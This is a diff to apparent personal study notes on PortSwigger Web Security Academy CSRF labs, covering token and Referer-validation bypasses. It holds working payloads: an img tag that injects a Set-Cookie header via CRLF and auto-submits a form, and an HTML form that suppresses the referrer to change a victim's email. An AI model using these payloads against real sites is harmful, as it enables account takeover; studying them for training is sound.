@@ -3,13 +3,14 @@
   The key here is that when the POST /my-account/change-email endpoint is changed to a GET request, the CSRF token is no longer validated
 - Generate CSRF PoC from POST request for email change and ==delete CSRF token
 - Generate CSRF PoC from POST request for email change by ==intercepting a POST request== (but no forwarding, don't complete the HTTP workflow for the email change). Works because CSRF token is not tied to session, and is single use.
-- ==CSRF where token is tied to non-session cookie== - Generate CSRF PoC from POST request for email change by ==intercepting a POST request== (but no forwarding, don't complete the HTTP workflow for the email change). The payload will look like:
+- ==CSRF where token is tied to non-session cookie== - Generate CSRF PoC from POST request for email change by ==intercepting a POST request== (but no forwarding, don't complete the HTTP workflow for the email change). <span style="color:green">Note to check the `source code` of the change email page for any additional form id values.</span> The payload will look like:
   ...
     \<input type="hidden" name="csrf" value="AY8WjIoDF9Z3EIQR7fndKWjXj5kW8GIq" />
 	...
-    \<img src="https://lab_id.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=teS425qnjMzpugxNvD3z9U8t6iDZ2WLf%3b%20SameSite=None" onerror="document.forms[0].submit()">
+    `<img src="https://lab_id.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=teS425qnjMzpugxNvD3z9U8t6iDZ2WLf%3b%20SameSite=None" onerror="document.forms[0].submit()">`
 	...
 	(The script tag with the autosubmit has been removed and replaced with the image tag, which will set the cookie then submit the document). 
+	
 - ==CSRF where token is duplicated in cookie== value in POST body. 
  ...
  `<input type="hidden" name="csrf" value="fake" />`
@@ -44,6 +45,25 @@ document.location="https://lab.com/post/comment/confirmation%3fpostId%3d../my-ac
 document.forms[0].submit();
 </script>
 ```
+OR
+```
+<html>
+  <!-- CSRF PoC - CSRF where Referer validation depends on header being present -->
+  <body>
+<meta name="referrer" content="no-referrer">
+    <form action="https://TARGET.net/my-account/change-email" method="POST">
+      <input type="hidden" name="email" value="administrator&#64;EXPLOIT&#46;NET" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+history.pushState('', '', '/');
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+
+```
+
 - ==CSRF with broken Referer validation== - No CSRF Token
   In exploit server:
   HTTP/1.1 200 OK
